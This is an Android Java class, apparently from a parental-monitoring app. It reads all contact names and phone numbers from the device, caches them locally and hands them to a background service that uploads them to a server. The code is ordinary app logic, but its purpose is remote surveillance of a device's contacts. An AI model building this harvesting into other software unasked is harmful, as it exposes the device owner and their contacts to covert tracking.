package com.kidguard.asynctask;


import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;

import com.j256.ormlite.android.apptools.OpenHelperManager;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.stmt.QueryBuilder;
import com.kidguard.interfaces.Constant;
import com.kidguard.model.Contacts;
import com.kidguard.orm.DatabaseHelper;
import com.kidguard.services.BackgroundDataService;

import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

@SuppressWarnings("all")
public class ContactsAsyncTask extends AsyncTask<String, Void, ArrayList<Contacts>> implements Constant {
    private static final String TAG = ContactsAsyncTask.class.getSimpleName();
    private DatabaseHelper databaseHelper = null;
    private Dao<Contacts, Integer> contactsDao;
    private ArrayList<Contacts> lstContacts;
    private Context context;
    String email;

    /* Sms Constructor */
    public ContactsAsyncTask(Context context) {
        this.context = context;
    }

    /* DatabaseHelper */
    private DatabaseHelper getHelper() {
        if (databaseHelper == null) {
            databaseHelper = OpenHelperManager.getHelper(context, DatabaseHelper.class);
        }
        return databaseHelper;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        lstContacts = new ArrayList<>();
    }

    @Override
    protected ArrayList<Contacts> doInBackground(String... params) {
        try {
            contactsDao = getHelper().getContactsDao();
            ContentResolver cr = context.getContentResolver();
            Cursor cur = null;
            try {
                cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                        null, null, null, null);
                if (cur != null) {
                    if (contactsDao.isTableExists()) {
                        long numRows = contactsDao.countOf();
                        if (numRows != 0) {
                            final QueryBuilder<Contacts, Integer> queryBuilder = contactsDao.queryBuilder();
                            for (int i = 0; i < contactsDao.queryForAll().size(); i++) {
                                while (cur.moveToNext()) {
                                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                                    if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                                        // get the phone number
                                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                                new String[]{id}, null);

                                        if (pCur != null) {
                                            while (pCur.moveToNext()) {
                                                List<Contacts> results = queryBuilder.where()
                                                        .eq(Contacts.CONTACT_PHONE_NO,
                                                                pCur.getString(
                                                                        pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).query();
                                                if (results.size() == 0) {
                                                    setContactsPOJO(pCur, name, id);
                                                }
                                            }
                                            pCur.close();
                                        }


                                    }
                                }

                            }

                        } else {
                           if (cur.getCount() > 0) {
                                while (cur.moveToNext()) {
                                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                                    if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                                        // get the phone number
                                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                                new String[]{id}, null);
                                        if (pCur != null) {
                                            while (pCur.moveToNext()) {
                                                setContactsPOJO(pCur, name, id);
                                            }
                                            pCur.close();
                                        }
                                    }
                                }


                            }
                        }

                        // Contacts Fetch With Tag
                        lstContacts = contactsFetchWithTag(contactsDao, params[0]);

                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                /*if (cur != null && !cur.isClosed())
                    cur.close();*/
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }

        return lstContacts;
    }

    @Override
    protected void onPostExecute(ArrayList<Contacts> list) {
        super.onPostExecute(list);
        // Release databaseHelper
        if (databaseHelper != null) {
            OpenHelperManager.releaseHelper();
            databaseHelper = null;
        }
        if (list != null && list.size() > 0)
            Log.e(TAG, "Contacts List???" + list.size());
        BackgroundDataService.getInstance().sendContactsDataToServer(list);
    }


    /* setContactsPOJO With Cursor */
    private void setContactsPOJO(Cursor pCur, String name, String id) {
        try {
            final Contacts contact = new Contacts();
            String phone = pCur.getString(
                    pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            contact.setContactsName(name);
            contact.setContactsPhoneNo(phone);
            contact.setContact_id(id);
            contact.setContactStatus(FALSE);
            contactsDao.create(contact);
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    /* set Contacts POJO With List*/
    private void setContactsPOJO(ArrayList<Contacts> lstContactsSorted, List<Contacts> results, int i) {
        final Contacts contacts = new Contacts();
        contacts.setContactsName(results.get(i).getContactsName());
        contacts.setContactsPhoneNo(results.get(i).getContactsPhoneNo());
        contacts.setContactStatus(results.get(i).getContactStatus());
        contacts.setContact_id(results.get(i).getContact_id());
        lstContactsSorted.add(contacts);
    }

    /* Check Count */
    private void checkCount(ArrayList<Contacts> lstContactsSorted, List<Contacts> results, String count, int countNew) {

        if (results != null && results.size() > 0) {
            if (Integer.parseInt(count) == results.size()) {
                countNew = Integer.parseInt(count);
            } else if (Integer.parseInt(count) < results.size()) {
                countNew = Integer.parseInt(count);
            } else if (Integer.parseInt(count) > results.size()) {
                countNew = results.size();
            }

            for (int i = 0; i < countNew; i++) {
                setContactsPOJO(lstContactsSorted, results, i);
            }
        }
    }

    // Contacts Fetch With Tag
    private ArrayList<Contacts> contactsFetchWithTag(Dao<Contacts, Integer> contactsDao, String count) {
        ArrayList<Contacts> lstContactsSorted = new ArrayList<>();
        int countNew = 0;
        final QueryBuilder<Contacts, Integer> queryBuilder = contactsDao.queryBuilder();
        //queryBuilder.orderBy(Sms.SMS_ID, false); // descending sort
        try {

            if (!count.equals("")) {
                List<Contacts> results;
                results = queryBuilder.where().eq(Contacts.CONTACT_STATUS, FALSE).query();
                checkCount(lstContactsSorted, results, count, countNew);

            } else {
                List<Contacts> results;
                results = queryBuilder.where().eq(Contacts.CONTACT_STATUS, FALSE).query();
                if (results != null && results.size() > 0) {
                    for (int i = 0; i < results.size(); i++) {
                        setContactsPOJO(lstContactsSorted, results, i);
                    }
                }

            }
            return lstContactsSorted;

        } catch (SQLException e) {
            e.printStackTrace();
        }

        return lstContactsSorted;
    }

}